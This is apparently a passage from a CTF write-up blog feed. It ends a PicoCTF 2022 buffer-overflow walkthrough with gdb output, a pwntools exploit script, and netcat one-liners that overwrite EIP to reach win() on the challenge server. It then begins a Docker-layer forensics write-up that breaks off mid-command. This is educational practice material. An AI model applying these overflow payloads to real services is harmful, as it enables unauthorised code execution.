<p><img src="/assets/writeups/PicoCTF2022/patternoffset.png" alt="patternoffset.png" /></p>

<ul>
  <li>So now, we can create a string of 44 bits and then control the value of EIP with the following 4 bits.  Trying this with a pattern of length 44 and then our own string (<code class="language-plaintext highlighter-rouge">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3AbHELO</code>), then running again:</li>
</ul>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">run</span>
<span class="n">Starting</span> <span class="n">program</span><span class="o">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">shinris3n</span><span class="o">/</span><span class="n">sec</span><span class="o">/</span><span class="n">CTFs</span><span class="o">/</span><span class="n">PicoCTF2022</span><span class="o">/</span><span class="n">buffer</span> <span class="n">overflow</span> <span class="mi">1</span><span class="o">/</span><span class="n">vuln</span> 
<span class="n">Please</span> <span class="n">enter</span> <span class="n">your</span> <span class="n">string</span><span class="o">:</span> 
<span class="n">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3AbHELO</span>
<span class="n">Okay</span><span class="p">,</span> <span class="n">time</span> <span class="n">to</span> <span class="k">return</span><span class="p">...</span> <span class="n">Fingers</span> <span class="n">Crossed</span><span class="p">...</span> <span class="n">Jumping</span> <span class="n">to</span> <span class="mh">0x4f4c4548</span>

<span class="n">Program</span> <span class="n">received</span> <span class="n">signal</span> <span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">Segmentation</span> <span class="n">fault</span><span class="p">.</span>
<span class="p">[</span><span class="o">----------------------------------</span><span class="n">registers</span><span class="o">-----------------------------------</span><span class="p">]</span>
<span class="n">EAX</span><span class="o">:</span> <span class="mh">0x41</span> <span class="p">(</span><span class="sc">'A'</span><span class="p">)</span>
<span class="n">EBX</span><span class="o">:</span> <span class="mh">0x41326241</span> <span class="p">(</span><span class="err">'</span><span class="n">Ab2A</span><span class="err">'</span><span class="p">)</span>
<span class="n">ECX</span><span class="o">:</span> <span class="mh">0x41</span> <span class="p">(</span><span class="sc">'A'</span><span class="p">)</span>
<span class="n">EDX</span><span class="o">:</span> <span class="mh">0xffffffff</span> 
<span class="n">ESI</span><span class="o">:</span> <span class="mh">0x1</span> 
<span class="n">EDI</span><span class="o">:</span> <span class="mh">0x80490e0</span> <span class="p">(</span><span class="o">&lt;</span><span class="n">_start</span><span class="o">&gt;:</span>       <span class="n">endbr32</span><span class="p">)</span>
<span class="n">EBP</span><span class="o">:</span> <span class="mh">0x62413362</span> <span class="p">(</span><span class="err">'</span><span class="n">b3Ab</span><span class="err">'</span><span class="p">)</span>
<span class="n">ESP</span><span class="o">:</span> <span class="mh">0xffffd0b0</span> <span class="o">--&gt;</span> <span class="mh">0x0</span> 
<span class="n">EIP</span><span class="o">:</span> <span class="mh">0x4f4c4548</span> <span class="p">(</span><span class="err">'</span><span class="n">HELO</span><span class="err">'</span><span class="p">)</span>
<span class="n">EFLAGS</span><span class="o">:</span> <span class="mh">0x10282</span> <span class="p">(</span><span class="n">carry</span> <span class="n">parity</span> <span class="n">adjust</span> <span class="n">zero</span> <span class="n">SIGN</span> <span class="n">trap</span> <span class="n">INTERRUPT</span> <span class="n">direction</span> <span class="n">overflow</span><span class="p">)</span>
<span class="p">[</span><span class="o">-------------------------------------</span><span class="n">code</span><span class="o">-------------------------------------</span><span class="p">]</span>
<span class="n">Invalid</span> <span class="err">$</span><span class="n">PC</span> <span class="n">address</span><span class="o">:</span> <span class="mh">0x4f4c4548</span>
<span class="p">[</span><span class="o">------------------------------------</span><span class="n">stack</span><span class="o">-------------------------------------</span><span class="p">]</span>
<span class="mo">0000</span><span class="o">|</span> <span class="mh">0xffffd0b0</span> <span class="o">--&gt;</span> <span class="mh">0x0</span> 
<span class="mo">0004</span><span class="o">|</span> <span class="mh">0xffffd0b4</span> <span class="o">--&gt;</span> <span class="mh">0xffffd184</span> <span class="o">--&gt;</span> <span class="mh">0xffffd334</span> <span class="p">(</span><span class="s">"/home/shinris3n/sec/CTFs/PicoCTF2022/buffer overflow 1/vuln"</span><span class="p">)</span>
<span class="mo">000</span><span class="mi">8</span><span class="o">|</span> <span class="mh">0xffffd0b8</span> <span class="o">--&gt;</span> <span class="mh">0xffffd18c</span> <span class="o">--&gt;</span> <span class="mh">0xffffd370</span> <span class="p">(</span><span class="s">"SHELL=/bin/bash"</span><span class="p">)</span>
<span class="mo">0012</span><span class="o">|</span> <span class="mh">0xffffd0bc</span> <span class="o">--&gt;</span> <span class="mh">0x3e9</span> 
<span class="mo">0016</span><span class="o">|</span> <span class="mh">0xffffd0c0</span> <span class="o">--&gt;</span> <span class="mh">0xffffd0e0</span> <span class="o">--&gt;</span> <span class="mh">0x1</span> 
<span class="mo">0020</span><span class="o">|</span> <span class="mh">0xffffd0c4</span> <span class="o">--&gt;</span> <span class="mh">0x0</span> 
<span class="mo">0024</span><span class="o">|</span> <span class="mh">0xffffd0c8</span> <span class="o">--&gt;</span> <span class="mh">0x0</span> 
<span class="mo">002</span><span class="mi">8</span><span class="o">|</span> <span class="mh">0xffffd0cc</span> <span class="o">--&gt;</span> <span class="mh">0xf7ddb905</span> <span class="p">(</span><span class="o">&lt;</span><span class="n">__libc_start_main</span><span class="o">+</span><span class="mi">229</span><span class="o">&gt;:</span>       <span class="n">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x10</span><span class="p">)</span>
<span class="p">[</span><span class="o">------------------------------------------------------------------------------</span><span class="p">]</span>
<span class="n">Legend</span><span class="o">:</span> <span class="n">code</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">rodata</span><span class="p">,</span> <span class="n">value</span>
<span class="n">Stopped</span> <span class="n">reason</span><span class="o">:</span> <span class="n">SIGSEGV</span>
<span class="mh">0x4f4c4548</span> <span class="n">in</span> <span class="o">??</span> <span class="p">()</span>
</code></pre></div></div>

<ul>
  <li>Now we need to substitute in the address of the win() function, so we‚Äôll need to change the way we‚Äôre interacting with the program a bit and pipe our string so we can send the bytecode across.  For example: <code class="language-plaintext highlighter-rouge">gdb-peda$ run &lt; &lt;(echo -ne "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3AbHELO")</code> gives the same results as the above.  Now we can change the last 4 bits to the win() address we found earlier (0x080491f6), in little endian format.  Our full input to GDB becomes:  <code class="language-plaintext highlighter-rouge">run &lt; &lt;(echo -ne "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab\xf6\x91\x04\x08"</code></li>
</ul>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">run</span> <span class="o">&lt;</span> <span class="o">&lt;</span><span class="p">(</span><span class="n">echo</span> <span class="o">-</span><span class="n">ne</span> <span class="s">"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab</span><span class="se">\xf6\x91\x04\x08</span><span class="s">"</span><span class="p">)</span>
<span class="n">Starting</span> <span class="n">program</span><span class="o">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">shinris3n</span><span class="o">/</span><span class="n">sec</span><span class="o">/</span><span class="n">CTFs</span><span class="o">/</span><span class="n">PicoCTF2022</span><span class="o">/</span><span class="n">buffer</span> <span class="n">overflow</span> <span class="mi">1</span><span class="o">/</span><span class="n">vuln</span> <span class="o">&lt;</span> <span class="o">&lt;</span><span class="p">(</span><span class="n">echo</span> <span class="o">-</span><span class="n">ne</span> <span class="s">"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab</span><span class="se">\xf6\x91\x04\x08</span><span class="s">"</span><span class="p">)</span>
<span class="n">Please</span> <span class="n">enter</span> <span class="n">your</span> <span class="n">string</span><span class="o">:</span> 
<span class="n">Okay</span><span class="p">,</span> <span class="n">time</span> <span class="n">to</span> <span class="k">return</span><span class="p">...</span> <span class="n">Fingers</span> <span class="n">Crossed</span><span class="p">...</span> <span class="n">Jumping</span> <span class="n">to</span> <span class="mh">0x80491f6</span>
<span class="n">picoCTF</span><span class="p">{</span><span class="n">test_flag</span><span class="p">}</span>

<span class="n">Program</span> <span class="n">received</span> <span class="n">signal</span> <span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">Segmentation</span> <span class="n">fault</span><span class="p">.</span>
<span class="p">[</span><span class="o">----------------------------------</span><span class="n">registers</span><span class="o">-----------------------------------</span><span class="p">]</span>
<span class="n">EAX</span><span class="o">:</span> <span class="mh">0x13</span> 
<span class="n">EBX</span><span class="o">:</span> <span class="mh">0x41326241</span> <span class="p">(</span><span class="err">'</span><span class="n">Ab2A</span><span class="err">'</span><span class="p">)</span>
<span class="n">ECX</span><span class="o">:</span> <span class="mh">0x13</span> 
<span class="n">EDX</span><span class="o">:</span> <span class="mh">0xffffffff</span> 
<span class="n">ESI</span><span class="o">:</span> <span class="mh">0x1</span> 
<span class="n">EDI</span><span class="o">:</span> <span class="mh">0x80490e0</span> <span class="p">(</span><span class="o">&lt;</span><span class="n">_start</span><span class="o">&gt;:</span>       <span class="n">endbr32</span><span class="p">)</span>
<span class="n">EBP</span><span class="o">:</span> <span class="mh">0x62413362</span> <span class="p">(</span><span class="err">'</span><span class="n">b3Ab</span><span class="err">'</span><span class="p">)</span>
<span class="n">ESP</span><span class="o">:</span> <span class="mh">0xffffd0b4</span> <span class="o">--&gt;</span> <span class="mh">0xffffd184</span> <span class="o">--&gt;</span> <span class="mh">0xffffd334</span> <span class="p">(</span><span class="s">"/home/shinris3n/sec/CTFs/PicoCTF2022/buffer overflow 1/vuln"</span><span class="p">)</span>
<span class="n">EIP</span><span class="o">:</span> <span class="mh">0x0</span>
<span class="n">EFLAGS</span><span class="o">:</span> <span class="mh">0x10282</span> <span class="p">(</span><span class="n">carry</span> <span class="n">parity</span> <span class="n">adjust</span> <span class="n">zero</span> <span class="n">SIGN</span> <span class="n">trap</span> <span class="n">INTERRUPT</span> <span class="n">direction</span> <span class="n">overflow</span><span class="p">)</span>
<span class="p">[</span><span class="o">-------------------------------------</span><span class="n">code</span><span class="o">-------------------------------------</span><span class="p">]</span>
<span class="n">Invalid</span> <span class="err">$</span><span class="n">PC</span> <span class="n">address</span><span class="o">:</span> <span class="mh">0x0</span>
<span class="p">[</span><span class="o">------------------------------------</span><span class="n">stack</span><span class="o">-------------------------------------</span><span class="p">]</span>
<span class="mo">0000</span><span class="o">|</span> <span class="mh">0xffffd0b4</span> <span class="o">--&gt;</span> <span class="mh">0xffffd184</span> <span class="o">--&gt;</span> <span class="mh">0xffffd334</span> <span class="p">(</span><span class="s">"/home/shinris3n/sec/CTFs/PicoCTF2022/buffer overflow 1/vuln"</span><span class="p">)</span>
<span class="mo">0004</span><span class="o">|</span> <span class="mh">0xffffd0b8</span> <span class="o">--&gt;</span> <span class="mh">0xffffd18c</span> <span class="o">--&gt;</span> <span class="mh">0xffffd370</span> <span class="p">(</span><span class="s">"SHELL=/bin/bash"</span><span class="p">)</span>
<span class="mo">000</span><span class="mi">8</span><span class="o">|</span> <span class="mh">0xffffd0bc</span> <span class="o">--&gt;</span> <span class="mh">0x3e9</span> 
<span class="mo">0012</span><span class="o">|</span> <span class="mh">0xffffd0c0</span> <span class="o">--&gt;</span> <span class="mh">0xffffd0e0</span> <span class="o">--&gt;</span> <span class="mh">0x1</span> 
<span class="mo">0016</span><span class="o">|</span> <span class="mh">0xffffd0c4</span> <span class="o">--&gt;</span> <span class="mh">0x0</span> 
<span class="mo">0020</span><span class="o">|</span> <span class="mh">0xffffd0c8</span> <span class="o">--&gt;</span> <span class="mh">0x0</span> 
<span class="mo">0024</span><span class="o">|</span> <span class="mh">0xffffd0cc</span> <span class="o">--&gt;</span> <span class="mh">0xf7ddb905</span> <span class="p">(</span><span class="o">&lt;</span><span class="n">__libc_start_main</span><span class="o">+</span><span class="mi">229</span><span class="o">&gt;:</span>       <span class="n">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x10</span><span class="p">)</span>
<span class="mo">002</span><span class="mi">8</span><span class="o">|</span> <span class="mh">0xffffd0d0</span> <span class="o">--&gt;</span> <span class="mh">0x1</span> 
<span class="p">[</span><span class="o">------------------------------------------------------------------------------</span><span class="p">]</span>
<span class="n">Legend</span><span class="o">:</span> <span class="n">code</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">rodata</span><span class="p">,</span> <span class="n">value</span>
<span class="n">Stopped</span> <span class="n">reason</span><span class="o">:</span> <span class="n">SIGSEGV</span>
<span class="mh">0x00000000</span> <span class="n">in</span> <span class="o">??</span> <span class="p">()</span>
</code></pre></div></div>

<ul>
  <li>
    <p>We can see that this time, we‚Äôve successfully overwrote the return address with the win() function and the local flag is returned before the program crashes and exits.</p>
  </li>
  <li>
    <p>Now we can write some code that will interact with the network service and get the real flag.  An easy way to do this, and again one that will work more generally, is to use python pwntools (which may be installed via <code class="language-plaintext highlighter-rouge">pip3 install pwn</code>).</p>
  </li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># PicoCTF 2022 - Buffer Overflow 1
# shinris3n/NINPWN
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span> <span class="c1"># pip3 install pwn
</span>
<span class="c1"># Open up connection.
</span><span class="n">address</span> <span class="o">=</span> <span class="s">'saturn.picoctf.net'</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">59737</span>
<span class="n">tcpsocket</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>

<span class="c1"># Receive server input request
</span><span class="k">print</span><span class="p">((</span><span class="n">tcpsocket</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'latin-1'</span><span class="p">))).</span><span class="n">decode</span><span class="p">(</span><span class="s">'latin-1'</span><span class="p">))</span>

<span class="c1"># Define payload
</span><span class="n">payload</span> <span class="o">=</span> <span class="s">"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab</span><span class="se">\xf6\x91\x04\x08</span><span class="s">"</span>

<span class="c1"># Encode and send payload
</span><span class="n">tcpsocket</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'latin-1'</span><span class="p">))</span>
<span class="k">print</span> <span class="p">(</span><span class="s">'Sent: 0x'</span> <span class="o">+</span> <span class="n">binascii</span><span class="p">.</span><span class="n">hexlify</span><span class="p">(</span><span class="n">payload</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'latin-1'</span><span class="p">)).</span><span class="n">decode</span><span class="p">(</span><span class="s">'latin-1'</span><span class="p">)</span>
<span class="p">)</span>

<span class="c1"># Receive flag
</span><span class="k">print</span><span class="p">((</span><span class="n">tcpsocket</span><span class="p">.</span><span class="n">recvline</span><span class="p">()).</span><span class="n">decode</span><span class="p">(</span><span class="s">'latin-1'</span><span class="p">))</span> <span class="c1"># Receive line after string is entered
</span><span class="k">print</span><span class="p">((</span><span class="n">tcpsocket</span><span class="p">.</span><span class="n">recv</span><span class="p">()).</span><span class="n">decode</span><span class="p">(</span><span class="s">'latin-1'</span><span class="p">))</span> <span class="c1"># Receive the flag
</span>
<span class="c1"># Catch a shell (N/A to this challenge, but sharing because it's an extremely helpful function to know about when needing to exploit a system!)
# tcpsocket.interactive()
</span></code></pre></div></div>
<ul>
  <li>The exploit code establishes a connection to our instance and uses our previous payload string to successfully capture the flag:</li>
</ul>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">‚îå‚îÄ‚îÄ(shinris3n„âøkodachi)-[~/sec/CTFs/PicoCTF2022/buffer overflow 1]
</span><span class="gp">‚îî‚îÄ$</span><span class="w"> </span>python3 exploit.py 
<span class="go">[+] Opening connection to saturn.picoctf.net on port 59737: Done
Please enter your string: 

Sent: 0x4161304161314161324161334161344161354161364161374161384161394162304162314162324162334162f6910408
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6

picoCTF{redacted_flag_try_it_yourself_at_the_picoGym!}
[*] Closed connection to saturn.picoctf.net port 59737
</span></code></pre></div></div>

<ul>
  <li>If the pwntools library is not available, or for some reason the script doesn‚Äôt seem to interact properly with the service, command line solutions sending across the same payload include the following:</li>
</ul>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">(Using echo)

</span><span class="gp">shinris3n@bokken:~/sec/CTFs/PicoCTF2022/buffer overflow 2$</span><span class="w"> </span><span class="o">(</span><span class="nb">echo</span> <span class="nt">-ne</span> <span class="s1">'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab\xf6\x91\x04\x08\n'</span><span class="p">;</span> <span class="nb">cat</span> -<span class="o">)</span> | nc saturn.picoctf.net 60968
<span class="go">Please enter your string: 

Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{redacted_flag_try_it_yourself_at_the_picoGym!}
</span></code></pre></div></div>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">(Using Python 3)

</span><span class="gp">shinris3n@bokken:~/sec/CTFs/PicoCTF2022/buffer overflow 2$</span><span class="w"> </span><span class="o">(</span>python3 <span class="nt">-c</span> <span class="s2">"import sys; sys.stdout.buffer.write(b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab</span><span class="se">\x</span><span class="s2">f6</span><span class="se">\x</span><span class="s2">91</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08')"</span><span class="p">;</span> <span class="nb">cat</span> -<span class="o">)</span> | nc saturn.picoctf.net 60968
<span class="go">Please enter your string: 

Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{redacted_flag_try_it_yourself_at_the_picoGym!}
</span></code></pre></div></div>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">(Using printf)

</span><span class="gp">shinris3n@bokken:~/sec/CTFs/PicoCTF2022/buffer overflow 2$</span><span class="w"> </span><span class="o">(</span><span class="nb">printf</span> <span class="s1">'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab\xf6\x91\x04\x08'</span><span class="p">;</span> <span class="nb">cat</span> -<span class="o">)</span> | nc saturn.picoctf.net 58429
<span class="go">Please enter your string: 

Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{redacted_flag_try_it_yourself_at_the_picoGym!}
</span></code></pre></div></div>]]></content><author><name>shinris3n</name></author><category term="[&quot;writeups&quot;]" /><category term="PicoCTF2022" /><category term="buffer overflows" /><summary type="html"><![CDATA[Challenge Text:]]></summary></entry><entry><title type="html">layers</title><link href="http://0.0.0.0:4000/writeups/2021/10/24/Buckeye2021-layers.html" rel="alternate" type="text/html" title="layers" /><published>2021-10-24T22:06:42-05:00</published><updated>2021-10-24T22:06:42-05:00</updated><id>http://0.0.0.0:4000/writeups/2021/10/24/Buckeye2021-layers</id><content type="html" xml:base="http://0.0.0.0:4000/writeups/2021/10/24/Buckeye2021-layers.html"><![CDATA[<h1></h1>
<h3><font color="FF3030"> Challenge Text: </font></h3>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">Author: qxxxb

Check out my brand new docker repo https://hub.docker.com/r/qxxxb/layers

</span></code></pre></div></div>
<h3><font color="FF3030"> Solution: </font></h3>

<ul>
  <li>Navigating to the site provided we‚Äôre provided with a docker image to pull:</li>
</ul>

<p><img src="/assets/writeups/BuckeyeCTF2021/50e68d39a21a5e9a267b120edf7c8a4b.png" alt="50e68d39a21a5e9a267b120edf7c8a4b.png" /></p>

<ul>
  <li>Checking out the image we discover that it seems as if a file named flag.png once existed inside, but no longer does:</li>
</ul>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">‚îå‚îÄ‚îÄ(shinris3n„âøkodachi)-[~/sec/CTFs/BuckeyeCTF2021/misc/layers]
</span><span class="gp">‚îî‚îÄ$</span><span class="w"> </span>docker pull qxxxb/layers
<span class="go">Using default tag: latest
latest: Pulling from qxxxb/layers
a0d0a0d46f8b: Pull complete 
9a653c77c575: Pull complete 
5b35be6cf17d: Pull complete 
5895c1ac3aab: Pull complete 
Digest: sha256:a89678536727abc0fbfe693b19ac0f8454502351dc792dabbee47bc9ab7420b2
Status: Downloaded newer image for qxxxb/layers:latest
docker.io/qxxxb/layers:latest

‚îå‚îÄ‚îÄ(shinris3n„âøkodachi)-[~/sec/CTFs/BuckeyeCTF2021/misc/layers]
</span><span class="gp">‚îî‚îÄ$</span><span class="w"> </span>docker images
<span class="go">REPOSITORY      TAG       IMAGE ID       CREATED         SIZE
qxxxb/layers    latest    0c01a25ae5b7   5 days ago      6.19MB

‚îå‚îÄ‚îÄ(shinris3n„âøkodachi)-[~/sec/CTFs/BuckeyeCTF2021/misc/layers]
</span><span class="gp">‚îî‚îÄ$</span><span class="w"> </span>docker run <span class="nt">-it</span> qxxxb/layers
<span class="gp">/ #</span><span class="w"> </span><span class="nb">whoami</span>
<span class="go">root
</span><span class="gp">/ #</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-al</span>
<span class="go">total 72
drwxr-xr-x    1 root     root          4096 Oct 25 00:51 .
drwxr-xr-x    1 root     root          4096 Oct 25 00:51 ..
-rwxr-xr-x    1 root     root             0 Oct 25 00:51 .dockerenv
-rw-rw-r--    1 root     root           124 Oct 19 15:26 Dockerfile
drwxr-xr-x    2 root     root          4096 Aug 27 11:05 bin
drwxr-xr-x    5 root     root           360 Oct 25 00:51 dev
drwxr-xr-x    1 root     root          4096 Oct 25 00:51 etc
drwxr-xr-x    2 root     root          4096 Aug 27 11:05 home
drwxr-xr-x    7 root     root          4096 Aug 27 11:05 lib
drwxr-xr-x    5 root     root          4096 Aug 27 11:05 media
-rw-r--r--    1 root     root            36 Oct 19 15:26 message.txt
drwxr-xr-x    2 root     root          4096 Aug 27 11:05 mnt
drwxr-xr-x    2 root     root          4096 Aug 27 11:05 opt
dr-xr-xr-x  306 root     root             0 Oct 25 00:51 proc
drwx------    1 root     root          4096 Oct 25 00:51 root
drwxr-xr-x    2 root     root          4096 Aug 27 11:05 run
drwxr-xr-x    2 root     root          4096 Aug 27 11:05 sbin
drwxr-xr-x    2 root     root          4096 Aug 27 11:05 srv
dr-xr-xr-x   13 root     root             0 Oct 25 00:51 sys
drwxrwxrwt    2 root     root          4096 Aug 27 11:05 tmp
drwxr-xr-x    7 root     root          4096 Aug 27 11:05 usr
drwxr-xr-x   12 root     root          4096 Aug 27 11:05 var
</span><span class="gp">/ #</span><span class="w"> </span><span class="nb">cat </span>message.txt 
<span class="go">Sorry, the flag has been deleted :(
</span><span class="gp">/ #</span><span class="w"> </span><span class="nb">cat </span>Dockerfile 
<span class="go">FROM alpine:latest
COPY flag.png Dockerfile /
RUN rm flag.png
</span><span class="gp">RUN echo "Sorry, the flag has been deleted :(" &gt;</span><span class="w"> </span>/message.txt
<span class="gp">/ #</span><span class="w"> </span>^C
<span class="gp">/ #</span><span class="w"> </span><span class="nb">exit</span>
</code></pre></div></div>

<ul>
  <li>Checking the image history, it doesn‚Äôt seem as if we can‚Äôt easily just revert to previous layers because we didn‚Äôt build this ourselves locally:</li>
</ul>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">‚îå‚îÄ‚îÄ(shinris3n„âøkodachi)-[~/sec/CTFs/BuckeyeCTF2021/misc/layers]
</span><span class="gp">‚îî‚îÄ$</span><span class="w"> </span>docker <span class="nb">history </span>qxxxb/layers
<span class="go">IMAGE          CREATED       CREATED BY                                      SIZE      COMMENT
0c01a25ae5b7   5 days ago    /bin/sh -c echo "Sorry, the flag has been de‚Ä¶   36B       
</span><span class="gp">&lt;missing&gt;</span><span class="w">      </span>5 days ago    /bin/sh <span class="nt">-c</span> <span class="nb">rm </span>flag.png                          0B        
<span class="gp">&lt;missing&gt;</span><span class="w">      </span>5 days ago    /bin/sh <span class="nt">-c</span> <span class="c">#(nop) COPY multi:6b3bd56201fda03‚Ä¶   599kB     </span>
<span class="gp">&lt;missing&gt;</span><span class="w">      </span>8 weeks ago   /bin/sh <span class="nt">-c</span> <span class="c">#(nop)  CMD ["/bin/sh"]              0B        </span>
<span class="gp">&lt;missing&gt;</span><span class="w">      </span>8 weeks ago   /bin/sh <span class="nt">-c</span> <span class="c">#(nop) ADD file:aad4290d27580cc1a‚Ä¶   5.6MB  </span>
</code></pre></div></div>

<ul>
  <li>However, digging a bit deeper we notice that the previous layers appear to have some artifacts left over that we can find on our local machine in /var/lib/docker/overlay2/:</li>
</ul>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">‚îå‚îÄ‚îÄ(shinris3n„âøkodachi)-[~/sec/CTFs/BuckeyeCTF2021/misc/layers]
</span><span class="gp">‚îî‚îÄ$</span><span class="w"> </span>docker inspect qxxxb/layers                                                                                             
<span class="go">[
    {
        "Id": "sha256:0c01a25ae5b745b06c68c7b870b848f327227e06feca8f121c105d3cc423ebc9",
        "RepoTags": [
            "qxxxb/layers:latest"
        ],
        "RepoDigests": [
            "qxxxb/layers@sha256:a89678536727abc0fbfe693b19ac0f8454502351dc792dabbee47bc9ab7420b2"
        ],
        "Parent": "",
        "Comment": "",
        "Created": "2021-10-19T15:26:49.240573536Z",
        "Container": "f6fb5543fac6f92af65af594f2547a659761eecfa1cafd720d631e6ca2bb0e1e",
        "ContainerConfig": {
            "Hostname": "",
            "Domainname": "",
            "User": "",
            "AttachStdin": false,
            "AttachStdout": false,
            "AttachStderr": false,
            "Tty": false,
            "OpenStdin": false,
            "StdinOnce": false,
            "Env": [
                "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
            ],
            "Cmd": [
                "/bin/sh",
                "-c",
</span><span class="gp">                "echo \"Sorry, the flag has been deleted :(\" &gt;</span><span class="w"> </span>/message.txt<span class="s2">"
</span><span class="go">            ],
            "Image": "sha256:d6aa6df23fb1b311908fad5a8eb92626650ece786144bc04e6ca02a3807fb02e",
            "Volumes": null,
            "WorkingDir": "",
            "Entrypoint": null,
            "OnBuild": null,
            "Labels": null
        },
        "DockerVersion": "20.10.6",
        "Author": "",
        "Config": {
            "Hostname": "",
            "Domainname": "",
            "User": "",
            "AttachStdin": false,
            "AttachStdout": false,
            "AttachStderr": false,
            "Tty": false,
            "OpenStdin": false,
            "StdinOnce": false,
            "Env": [
                "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
            ],
            "Cmd": [
                "/bin/sh"
            ],
            "Image": "sha256:d6aa6df23fb1b311908fad5a8eb92626650ece786144bc04e6ca02a3807fb02e",
            "Volumes": null,
            "WorkingDir": "",
            "Entrypoint": null,
            "OnBuild": null,
            "Labels": null
        },
        "Architecture": "amd64",
        "Os": "linux",
        "Size": 6194599,
        "VirtualSize": 6194599,
        "GraphDriver": {
            "Data": {
                "LowerDir": "/var/lib/docker/overlay2/a53ad803fcada3d5c4c3ad52b01d540c8d8a9358a46662dede804860ca9eba93/diff:/var/lib/docker/overlay2/aa2bcbd0951a0e898cb73e412ab47c09d77fc753c0947022e1fb0edfcc3cc08a/diff:/var/lib/docker/overlay2/6486d308eb4271abb881399b0f032c264a0296ad7612a1a82b41488a52eab8bb/diff",
                "MergedDir": "/var/lib/docker/overlay2/b93b559c421b5ec21015b2339e968457bcdbd7703f8c4181c6403db220ba7d5c/merged",
                "UpperDir": "/var/lib/docker/overlay2/b93b559c421b5ec21015b2339e968457bcdbd7703f8c4181c6403db220ba7d5c/diff",
                "WorkDir": "/var/lib/docker/overlay2/b93b559c421b5ec21015b2339e968457bcdbd7703f8c4181c6403db220ba7d5c/work"
            },
            "Name": "overlay2"
        },
        "RootFS": {
            "Type": "layers",
            "Layers": [
                "sha256:e2eb06d8af8218cfec8210147357a68b7e13f7c485b991c288c2d01dc228bb68",
                "sha256:a6951987fab1e53365680416db4c728a89783aa2b8c39bd2879aabfcffab95d9",
                "sha256:3d2c9f04c82dbb90411e102ed7e2e49b412b03e2f0021a40d3af818e02cdd0f7",
                "sha256:50d11bbfd2f65f57406491bdd23baad9a62672b8080d243a590c37e7dc7eab73"
            ]
        },
        "Metadata": {
            "LastTagTime": "0001-01-01T00:00:00Z"
        }
    }
]
</span></code></pre></div></div>

<ul>
  <li>We know we are searching for flag.png in one of these directories.  Navigating to /var/lib/docker/overlay2/ we hit a bit of a minor roadblock that won‚Äôt be a problem on our own machine:</li>
</ul>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">‚îå‚îÄ‚îÄ(shinris3n„âøkodachi)-[~/sec/CTFs/BuckeyeCTF2021/misc/layers]
</span><span class="gp">‚îî‚îÄ$</span><span class="w"> </span><span class="nb">cd</span> /var/lib/docker/overlay2/
<span class="go">
‚îå‚îÄ‚îÄ(shinris3n„âøkodachi)-[/var/lib/docker/overlay2]
</span><span class="gp">‚îî‚îÄ$</span><span class="w"> </span><span class="nb">ls</span>                                                                                                                             
